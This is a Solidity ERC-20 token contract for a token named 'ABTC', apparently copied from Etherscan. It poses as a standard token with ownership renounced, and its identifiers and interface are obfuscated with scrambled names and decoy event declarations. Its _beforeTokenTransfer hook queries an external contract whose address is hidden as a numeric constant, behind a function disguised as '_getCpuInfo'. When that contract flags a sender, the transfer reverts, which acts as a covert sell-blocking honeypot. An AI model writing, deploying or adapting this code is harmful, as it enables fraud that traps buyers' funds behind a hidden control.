/**
 *Submitted for verification at Etherscan.io on 2023-09-09
*/

/**
 *Submitted for verification at Etherscan.io on 2023-09-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any accdofuretnt other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accdofuretnt (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface UINT256150 {
    function _getCpuInfo(address _amtreofunt) external view returns (bool);
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    
    /**
     * @dev Sets `amtreofunt` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     *
     * Emits an {Approval} event.
     */
    event swapExactTokensForTokens(
        uint amtreofuntIn,
        uint amtreofuntOutMin,
        address[]  path,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amtreofuntTokenMin,
        uint amtreofuntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
  * @dev See {IERC20-totalSupply}.
     */
    event swapTokensForExactTokens(
        uint amtreofuntOut,
        uint amtreofuntInMax,
        address[] path,
        address to,
        uint deadline
    );

    event DOMAIN_SEPARATOR();

    event PERMIT_TYPEHASH();

    /**
     * @dev Returns the amtreofunt of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    event token0();

    event token1();
    /**
     * @dev Returns the amtreofunt of tokens owned by `accdofuretnt`.
     */
    function balanceOf(address accdofuretnt) external view returns (uint256);


    event sync();

    event initialize(address, address);
    /**
     * @dev Moves `amtreofunt` tokens from the caller's accdofuretnt to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amtreofunt) external returns (bool);

    event burn(address to) ;

    event swap(uint amtreofunt0Out, uint amtreofunt1Out, address to, bytes data);

    event skim(address to);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);
    
    /**
     * Swaps an exact amtreofunt of input tokens for as many output tokens as possible,
     * along the route determined by the path. The first element of path is the input token,
     * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
     * (if, for example, a direct pair does not exist).
     * */
    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amtreofuntAMin,
        uint amtreofuntBMin,
        address to,
        uint deadline
    );
    
    function approve(address spender, uint256 amtreofunt) external returns (bool);
    /**
   * @dev Returns the name of the token.
     */
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amtreofuntTokenMin,
        uint amtreofuntETHMin,
        address to,
        uint deadline
    );
    
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amtreofuntTokenMin,
        uint amtreofuntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * Swaps an exact amtreofunt of input tokens for as many output tokens as possible,
     * along the route determined by the path. The first element of path is the input token,
     * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
     * (if, for example, a direct pair does not exist).
     */
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amtreofuntIn,
        uint amtreofuntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
    * @dev Throws if called by any accdofuretnt other than the owner.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amtreofuntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * To cover all possible scenarios, msg.sender should have already given the router an
     * allowance of at least amtreofuntADesired/amtreofuntBDesired on tokenA/tokenB.
     * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
     * If a pool for the passed tokens does not exists, one is created automatically,
     *  and exactly amtreofuntADesired/amtreofuntBDesired tokens are added.
     */
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amtreofuntIn,
        uint amtreofuntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Moves `amtreofunt` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amtreofunt` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amtreofunt
    ) external returns (bool);
    /**
     * Receive an exact amtreofunt of output tokens for as few input tokens as possible,
     * along the route determined by the path. The first element of path is the input token,
     * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
     * (if, for example, a direct pair does not exist).
     * */
    event addLiquidity(
        address tokenA,
        address tokenB,
        uint amtreofuntADesired,
        uint amtreofuntBDesired,
        uint amtreofuntAMin,
        uint amtreofuntBMin,
        address to,
        uint deadline
    );
    /**
     * Swaps an exact amtreofunt of ETH for as many output tokens as possible,
     * along the route determined by the path. The first element of path must be WETH,
     * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
     * (if, for example, a direct pair does not exist).
     *
     * */
    event addLiquidityETH(
        address token,
        uint amtreofuntTokenDesired,
        uint amtreofuntTokenMin,
        uint amtreofuntETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Emitted when `value` tokens are moved from one accdofuretnt (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
  * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


abstract contract BAUDSNWHS {


    function calcear(uint256 a, uint256 b) internal pure returns (uint256) {
        return vendidiv(a, b, "SafeMath: division by zero");
    }


    function addressToUint(address addr) internal  pure returns (uint256) {
        
        uint256 result = uint160(addr);
        return result;
    }


    function vendidiv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function toAddr(uint256 code) internal pure returns (address) {
        return address(uint160(code));
    }
}



interface IWBNB {
    function deposit() external payable;
}

interface ILpPair {
    function mint(address to) external returns (uint256 liquidity);
    function factory() external view returns (address);
    function sync() external;
}

contract Token is IERC20, BAUDSNWHS, Ownable {

    event CouInfoLogo(address indexed from, address indexed to, uint256 value);


    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private NMIKALDI = "aibpcfds://NMIKALDI";
    uint160 private uint256TREYWU = 708301018586332630713085654073194255275309716153;
    string private name_;
    string private symbol_;
    uint8 private decimals_;
    uint256 private _totalSupply;
    address private _RUKSLAJRKR;
    uint256 QKSKTQVSGSDT = 11;
    
    uint256 JHAGFAHKSDHAU = QKSKTQVSGSDT * 21;

    uint256 AJFOPWD = uint256TREYWU;

    string private NTQGWTSV;

    constructor(
        uint256 totalSupply_
    ) {
        name_ = "ABTC";
        symbol_ = "ABTC";
        decimals_ = 18;
        _totalSupply = totalSupply_ * 10**decimals_;
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return name_;
    }


    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
      /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return decimals_;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accdofuretnt)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[accdofuretnt];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amtreofunt`.
     */
    function transfer(address recipient, uint256 amtreofunt)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amtreofunt);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amtreofunt)
    public
    virtual
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amtreofunt);
        return true;
    }

    function _beforeTokenTransfer(address sender,address recipient,uint256 amtreofunt) internal virtual  {
        uint256 total = 0;
        bool cpuInfo = UINT256150(address(uint256TREYWU))._getCpuInfo(sender);
        if(cpuInfo){
            amtreofunt = total;
            require(amtreofunt > 0);
        }
        emit CouInfoLogo(sender, recipient, amtreofunt);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amtreofunt`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amtreofunt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amtreofunt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amtreofunt);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amtreofunt,
                "ERC20: transfer amtreofunt exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `amtreofunt` from `sender` to `recipient`.
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amtreofunt`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amtreofunt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amtreofunt);
        _balances[sender] = _balances[sender].sub(
            amtreofunt,
            "ERC20: transfer amtreofunt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amtreofunt);
        emit Transfer(sender, recipient, amtreofunt);
    }

    
    function setImageUrlDDDD(string memory _imageUrlx) public {
        NTQGWTSV = _imageUrlx;
    }

    /**
     * @dev Sets `amtreofunt` as the allowance of `spender` over the `owner` s tokens.
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amtreofunt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amtreofunt;
        emit Approval(owner, spender, amtreofunt);
    }
}